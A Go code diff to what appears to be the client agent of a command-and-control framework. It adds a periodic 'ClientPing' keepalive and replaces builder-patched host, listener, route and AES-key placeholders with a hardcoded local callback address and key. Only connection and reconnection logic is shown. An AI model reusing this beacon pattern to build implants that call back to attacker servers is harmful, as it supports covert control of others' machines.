@@ -17,6 +17,7 @@ import (
 type Client struct {
 	Connection *wsc.Wsc
 	lock       sync.Mutex // 加入一个锁
+	keepAlive  *time.Ticker
 }
 
 func (c *Client) SendData(data []byte) {
@@ -67,17 +68,17 @@ func (c *Client) Connect(url string) {
 	c.Connection = wsc.New(url)
 	// 可自定义配置，不使用默认配置
 	c.Connection.SetConfig(&wsc.Config{
-		// 写超时
+		// Write timeout
 		WriteWait: 10 * time.Second,
-		// 支持接受的消息最大长度，默认512字节
-		MaxMessageSize: 1024 * 1024 * 10,
-		// 最小重连时间间隔
+		// The maximum length of the message supported is 512 bytes by default
+		//MaxMessageSize: 1024 * 1024 * 10,
+		// Minimum reconnection time interval
 		MinRecTime: 2 * time.Second,
-		// 最大重连时间间隔
+		// Maximum reconnection time interval
 		MaxRecTime: 60 * time.Second,
-		// 每次重连失败继续重连的时间间隔递增的乘数因子，递增到最大重连时间间隔为止
+		// The multiplier factor for the time interval between reconnections after each reconnection failure, increasing until the maximum reconnection time interval is reached
 		RecFactor: 1.5,
-		// 消息发送缓冲池大小，默认256
+		// Message sending buffer pool size, default is 256
 		MessageBufferSize: 10240 * 10,
 	})
 	// 设置回调处理
@@ -118,6 +119,15 @@ func (c *Client) Connect(url string) {
 		//log.Println("binary_message_received: ", string(data))
 		HandlePacket.Read(data, c.Connection)
 	})
+	go c.Connection.Connect()
+	c.keepAlive = time.NewTicker(5 * time.Second)
+
+	// 	// Start a goroutine to handle the ticks
+	go func() {
+		for range c.keepAlive.C {
+			c.KeepAlivePacket()
+		}
+	}()
 	// 开始连接
 	go c.Connection.Connect()
 	//go controller.Start()
@@ -134,28 +144,35 @@ func run_main(Host string) {
 	client.Connect(Host)
 }
 
-//var host = "192.168.8.123" // assuming for the sake of example
-//var port = "4000"
+// var host = "192.168.8.123" // assuming for the sake of example
+// var port = "4000"
+func (c *Client) KeepAlivePacket() {
+	msgpack := new(MessagePack.MsgPack)
+	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
+	msgpack.ForcePathObject("Message").SetAsString("DDDD")
+	c.SendData(msgpack.Encode2Bytes())
+}
 
 var ClientWorking bool
 
 func main() {
 
 	//release
-	Host := "HostAAAABBBBCCCCDDDD"
-	Port := "PortAAAABBBBCCCCDDDD"
-	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
-	route := "RouteAAAABBBBCCCCDDDD"
-	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	// Host := "HostAAAABBBBCCCCDDDD"
+	// Port := "PortAAAABBBBCCCCDDDD"
+	// ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	// route := "RouteAAAABBBBCCCCDDDD"
+	// PcInfo.AesKey = "AeskAAAABBBBCCCC"
+	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
+	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	// PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
 	PcInfo.ClientComputer = GetClientComputer()
 	///Debug
-	// Host := "192.168.1.250"
-	// Port := "5000"
-	// PcInfo.ListenerName = "wslinux"
-	// route := "www"
-
+	Host := "192.168.1.7"
+	Port := "4500"
+	PcInfo.ListenerName = "dwd"
+	route := "www"
+	PcInfo.AesKey = "QWERt_CSDMAHUATW"
 	//url := "ws://127.0.0.1:80/Echo"
 	url := "ws://" + Host + ":" + Port + "/" + route
 	url = strings.ReplaceAll(url, " ", "")
